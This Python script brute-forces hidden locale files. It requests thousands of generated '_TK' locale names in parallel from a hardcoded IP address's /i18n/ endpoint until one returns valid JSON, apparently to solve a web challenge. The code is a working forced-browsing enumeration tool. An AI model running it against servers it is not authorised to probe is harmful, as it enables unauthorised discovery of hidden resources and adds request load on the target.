import json
import string
from multiprocessing.pool import ThreadPool

import requests


def generate_locales():
    locales = []
    letters = list(string.ascii_lowercase)

    for letterA in letters:
        for letterB in letters:
            locales.append(letterA + letterB + "_TK")
            for letterC in letters:
                locales.append(letterA + letterB + letterC + "_TK")

    ignore_locales = ["ar_SA", "cs_CZ", "da_DK", "de_DE", "el_GR", "es_ES", "et_EE", "fi_FI", "fr_FR", "he_IL", "hi_IN",
                      "hu_HU", "id_ID", "it_IT", "ja_JP", "lt_LT", "lv_LV", "my_MM", "nl_NL", "no_NO", "pl_PL", "pt_PT",
                      "pt_BR", "ro_RO", "ru_RU", "sv_SE", "tr_TR", "ur_PK", "zh_CN", "zh_HK", "en"]

    final = list(set(locales) - set(ignore_locales))
    global total
    total = len(final)
    print("Total:", total)
    return final


def test_locale(locale):
    global found
    if not found:
        global failed
        try:
            json.loads(s.get('http://43.241.202.47:3003/i18n/' + locale + '.json').text)
            print(str(failed) + "/" + str(total) + " = " + str(round(failed / total * 100.0, 2)) + "%")
            found = locale
        except ValueError:
            failed = failed + 1
            if failed % 1000 == 0:
                print(str(failed) + "/" + str(total) + " = " + str(round(failed / total * 100.0, 2)) + "%")


found = False
failed = 0
total = 0
all_locales = generate_locales()
s = requests.Session()

with ThreadPool(10) as p:
    p.map(test_locale, all_locales)

if found:
    print('Found at: http://43.241.202.47:3003/i18n/' + str(found) + '.json')
else:
    print('None found!')
